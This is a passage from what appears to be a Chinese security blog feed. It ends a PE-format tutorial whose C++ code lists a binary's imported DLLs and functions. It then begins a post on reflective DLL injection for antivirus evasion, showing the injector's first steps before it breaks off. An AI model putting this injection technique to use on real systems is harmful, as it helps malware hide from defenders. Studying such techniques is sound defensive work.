class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如何使用RVA？</strong></p><p>RVA就是从文件开始IAT的基地址，所有<code>IMAGE_IMPORT_DESCRIPTOR</code>结构体都是从此开始找的。但是并没有相关变量说明了总数，那么只能依靠<code>IMAGE_IMPORT_DESCRIPTOR</code>的变量名来查找了，自然想到的就是Name为0就退出</p><p>对于<code>IMAGE_IMPORT_DESCRIPTOR</code>结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp; </span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>那么想办法打印<code>IMAGE_IMPORT_DESCRIPTOR</code>的结构体名称，可以由公式<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mi>a</mi><mi>m</mi><mi>e</mi><mi>O</mi><mi>f</mi><mi>f</mi><mi>s</mi><mi>e</mi><mi>t</mi><mo>=</mo><mi>N</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>−</mo><mi>V</mi><mi>A</mi><mo>+</mo><mi>P</mi><mi>t</mi><mi>r</mi><mi>T</mi><mi>o</mi><mi>R</mi><mi>a</mi><mi>w</mi><mi>D</mi><mi>a</mi><mi>t</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">NameOffset = Name -VA+PtrToRawData</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span></span></span></span>，**这个公式很重要，**直接打印文件<code>NameOffset</code>偏移的数据即可</p><p>首先重新编写从VA到RVA的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD64 <span class="title">dwVAToRVA</span><span class="params">(DWORD64 StartVA, DWORD64 nt_head_file_start, std::string&amp; fileContent, PIMAGE_NT_HEADERS64 ntTempHeader)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    DWORD64 iatDVA = StartVA;</span><br><span class="line"></span><br><span class="line">    DWORD64 iatVA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 RVA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 sectionFileAddr;</span><br><span class="line">    IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sectionFileAddr = nt_head_file_start + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">        sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sectionHeader-&gt;VirtualAddress &gt; iatDVA)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        iatVA = sectionHeader-&gt;VirtualAddress;</span><br><span class="line">        RVA = iatDVA - iatVA + sectionHeader-&gt;PointerToRawData;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> RVA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在main函数中打印</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR temp = <span class="built_in">PIMAGE_IMPORT_DESCRIPTOR</span>((DWORD64)&amp;fileContent[<span class="number">0</span>] + iatRVA + i * <span class="built_in">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR));</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; temp-&gt;Name != <span class="number">0</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    DWORD64 VA = <span class="built_in">dwVAToRVA</span>(temp-&gt;Name, nt_head_file_start, fileContent, ntTempHeader);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;  DLL: &quot;</span> &lt;&lt; (<span class="type">char</span>*)(&amp;fileContent[VA]) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    temp = <span class="built_in">PIMAGE_IMPORT_DESCRIPTOR</span>(&amp;fileContent[<span class="number">0</span>] + iatRVA + i * <span class="built_in">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151330424.png" alt="image-20250103132758136" /></p><p>同理，<code>IMAGE_IMPORT_DESCRIPTOR</code>中的<code>FirstThunk</code>也可以用于打印导入的函数名，也是将<code>FirstThunk</code>转为RVA，然后直接在源文件中查找RVA位置的字符串即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR temp = <span class="built_in">PIMAGE_IMPORT_DESCRIPTOR</span>((DWORD64)&amp;fileContent[<span class="number">0</span>] + iatRVA + i * <span class="built_in">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR));</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; temp-&gt;Name != <span class="number">0</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    DWORD64 VA = <span class="built_in">dwVAToRVA</span>(temp-&gt;Name, nt_head_file_start, fileContent, ntTempHeader);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;  DLL: &quot;</span> &lt;&lt; (<span class="type">char</span>*)(&amp;fileContent[VA]) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    VA = *<span class="built_in">PDWORD64</span>(&amp;fileContent[<span class="number">0</span>] + <span class="built_in">dwVAToRVA</span>(temp-&gt;FirstThunk, nt_head_file_start, fileContent, ntTempHeader));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">1</span>; VA != <span class="number">0</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PIMAGE_IMPORT_BY_NAME IatName = <span class="built_in">PIMAGE_IMPORT_BY_NAME</span>(&amp;fileContent[<span class="number">0</span>] + <span class="built_in">dwVAToRVA</span>(VA, nt_head_file_start, fileContent, ntTempHeader));</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;    -Function &quot;</span> &lt;&lt; IatName-&gt;Name &lt;&lt; std::endl;</span><br><span class="line">        VA = *<span class="built_in">PDWORD64</span>(&amp;fileContent[<span class="number">0</span>] + <span class="built_in">dwVAToRVA</span>(temp-&gt;FirstThunk, nt_head_file_start, fileContent, ntTempHeader) + i * <span class="built_in">sizeof</span>(DWORD64));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    temp = <span class="built_in">PIMAGE_IMPORT_DESCRIPTOR</span>(&amp;fileContent[<span class="number">0</span>] + iatRVA + i * <span class="built_in">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151337251.png" alt="image-20250103133415024" /></p><p>其他类型的<code>IMAGE_DATA_DIRECTORY</code>也是使用类似的方法就可以找到在静态二进制文件中的位置</p><h2 id="最后"><a class="markdownIt-Anchor" href="#最后"></a> 最后</h2><p>完整code:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD64 <span class="title">dwVAToRVA</span><span class="params">(DWORD64 StartVA, DWORD64 nt_head_file_start, std::string&amp; fileContent, PIMAGE_NT_HEADERS64 ntTempHeader)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    DWORD64 iatDVA = StartVA;</span><br><span class="line"></span><br><span class="line">    DWORD64 iatVA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 RVA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 sectionFileAddr;</span><br><span class="line">    IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sectionFileAddr = nt_head_file_start + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">        sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sectionHeader-&gt;VirtualAddress &gt; iatDVA)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        iatVA = sectionHeader-&gt;VirtualAddress;</span><br><span class="line">        RVA = iatDVA - iatVA + sectionHeader-&gt;PointerToRawData;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> RVA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> std::string filePath = <span class="string">&quot;notepad.exe&quot;</span>;</span><br><span class="line">    <span class="function">std::ifstream <span class="title">inputFile</span><span class="params">(filePath, std::ios::in | std::ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!inputFile.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;cant open: &quot;</span> &lt;&lt; filePath &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::ostringstream peFileString;</span><br><span class="line">    peFileString &lt;&lt; inputFile.<span class="built_in">rdbuf</span>();</span><br><span class="line">    std::string fileContent = peFileString.<span class="built_in">str</span>();</span><br><span class="line">    inputFile.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">    IMAGE_DOS_HEADER* dosHeader = (PIMAGE_DOS_HEADER)(DWORD64)(&amp;fileContent[<span class="number">0</span>]);</span><br><span class="line">    std::cout &lt;&lt; std::hex;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;PE e_magic  : 0x&quot;</span> &lt;&lt; dosHeader-&gt;e_magic &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;PE e_lfanew : 0x&quot;</span> &lt;&lt; dosHeader-&gt;e_lfanew &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    IMAGE_NT_HEADERS64* ntTempHeader = (PIMAGE_NT_HEADERS64)(DWORD64)(&amp;fileContent[dosHeader-&gt;e_lfanew]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SetConsoleOutputCP</span>(CP_UTF8);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;程序位数    : &quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (ntTempHeader-&gt;FileHeader.Machine == <span class="number">0x8664</span>)</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;64位\n&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (ntTempHeader-&gt;FileHeader.Machine == <span class="number">0x014c</span>)</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;32位\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;区段数量: &quot;</span> &lt;&lt; ntTempHeader-&gt;FileHeader.NumberOfSections &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="type">int</span> nt_head_file_start = dosHeader-&gt;e_lfanew;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD64 sectionFileAddr = nt_head_file_start + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">        IMAGE_SECTION_HEADER* sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]);</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot; Section[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] address: 0x&quot;</span> &lt;&lt; sectionFileAddr &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;            name        : &quot;</span> &lt;&lt; sectionHeader-&gt;Name &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;            VA          : 0x&quot;</span> &lt;&lt; sectionHeader-&gt;VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;            ptr2RawData : 0x&quot;</span> &lt;&lt; sectionHeader-&gt;PointerToRawData &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;---OptionalHeader.DataDirectories\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;基本重定位表           : 0x&quot;</span> &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;全局指针的相对虚拟地址   : 0x&quot;</span> &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_GLOBALPTR].VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;导入地址表             : 0x&quot;</span> &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    DWORD64 iatDVA = ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;</span><br><span class="line"></span><br><span class="line">    DWORD64 iatVA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 iatRVA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 sectionFileAddr;</span><br><span class="line">    IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sectionFileAddr = nt_head_file_start + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">        sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sectionHeader-&gt;VirtualAddress &gt; iatDVA)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        iatVA = sectionHeader-&gt;VirtualAddress;</span><br><span class="line">        iatRVA = iatDVA - iatVA + sectionHeader-&gt;PointerToRawData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR temp = <span class="built_in">PIMAGE_IMPORT_DESCRIPTOR</span>((DWORD64)&amp;fileContent[<span class="number">0</span>] + iatRVA + i * <span class="built_in">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; temp-&gt;Name != <span class="number">0</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD64 VA = <span class="built_in">dwVAToRVA</span>(temp-&gt;Name, nt_head_file_start, fileContent, ntTempHeader);</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;  DLL: &quot;</span> &lt;&lt; (<span class="type">char</span>*)(&amp;fileContent[VA]) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        VA = *<span class="built_in">PDWORD64</span>(&amp;fileContent[<span class="number">0</span>] + <span class="built_in">dwVAToRVA</span>(temp-&gt;FirstThunk, nt_head_file_start, fileContent, ntTempHeader));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">1</span>; VA != <span class="number">0</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            PIMAGE_IMPORT_BY_NAME IatName = <span class="built_in">PIMAGE_IMPORT_BY_NAME</span>(&amp;fileContent[<span class="number">0</span>] + <span class="built_in">dwVAToRVA</span>(VA, nt_head_file_start, fileContent, ntTempHeader));</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;    -Function &quot;</span> &lt;&lt; IatName-&gt;Name &lt;&lt; std::endl;</span><br><span class="line">            VA = *<span class="built_in">PDWORD64</span>(&amp;fileContent[<span class="number">0</span>] + <span class="built_in">dwVAToRVA</span>(temp-&gt;FirstThunk, nt_head_file_start, fileContent, ntTempHeader) + i * <span class="built_in">sizeof</span>(DWORD64));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        temp = <span class="built_in">PIMAGE_IMPORT_DESCRIPTOR</span>(&amp;fileContent[<span class="number">0</span>] + iatRVA + i * <span class="built_in">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/RrEZJDeKXdVqtjZPDs7AyQ&quot;&gt;https://mp.weixin.qq.com/s/RrEZJDeKXdVqtjZPDs7AyQ&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="bypass" scheme="https://joe1sn.eu.org/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】反射式DLL注入详解</title>
    <link href="https://joe1sn.eu.org/2024/10/01/reflect_dll/"/>
    <id>https://joe1sn.eu.org/2024/10/01/reflect_dll/</id>
    <published>2024-10-01T06:50:28.000Z</published>
    <updated>2025-02-27T07:18:28.943Z</updated>
    
    <content type="html"><![CDATA[<p>公众号：<a href="https://mp.weixin.qq.com/s/M92n3e-yCG64ry9GLt5A3A">https://mp.weixin.qq.com/s/M92n3e-yCG64ry9GLt5A3A</a></p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><h1 id="免杀反射式dll注入详解"><a class="markdownIt-Anchor" href="#免杀反射式dll注入详解"></a> 【免杀】反射式DLL注入详解</h1><p>在前文：<a href="https://mp.weixin.qq.com/s/RrEZJDeKXdVqtjZPDs7AyQ">PE文件格式解析</a>、<a href="https://mp.weixin.qq.com/s/qYO0Cf5MRT4vKCT5WYz1KQ">常见的DLL和Shellcode注入方式</a>中已经讲解了基本的注入方式和PE文件结构。那么我们可以提出这样指一种注入方式：将dll的内容放到目标进程中，然后找到这个dll完成PE映射到内存的函数（假设为<code>void loader()</code>），这也要求<code>loader</code>函数一定要在导出表上。</p><ol><li>获得dll<code>loader</code>函数在内存中的虚拟地址</li><li>注入器将dll写入目标进程然后调用<code>loader</code></li><li>loader运行</li></ol><h2 id="注入器编写"><a class="markdownIt-Anchor" href="#注入器编写"></a> 注入器编写</h2><ol><li><p>打开dll文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   std::string path;</span><br><span class="line">   DWORD pid;</span><br><span class="line">   std::cout &lt;&lt; <span class="string">&quot;[+] pid: &quot;</span>;</span><br><span class="line">   <span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;pid);</span><br><span class="line">std::cin.<span class="built_in">ignore</span>();</span><br><span class="line">   std::cout &lt;&lt; <span class="string">&quot;[+] DLL Path: &quot;</span>;</span><br><span class="line">   std::<span class="built_in">getline</span>(std::cin, path);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//1.打开dll文件</span></span><br><span class="line">   HANDLE hFile = <span class="built_in">CreateFileA</span>(path.<span class="built_in">c_str</span>(), GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">       std::cout &lt;&lt; <span class="string">&quot;Create File Failed\n&quot;</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">if</span> (dwFileSize == <span class="number">0</span>) &#123;</span><br><span class="line">       std::cout &lt;&lt; <span class="string">&quot;File Size is Zero!\n&quot;</span>;</span><br><span class="line">       <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li><li><p>将dll写入到目标进程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 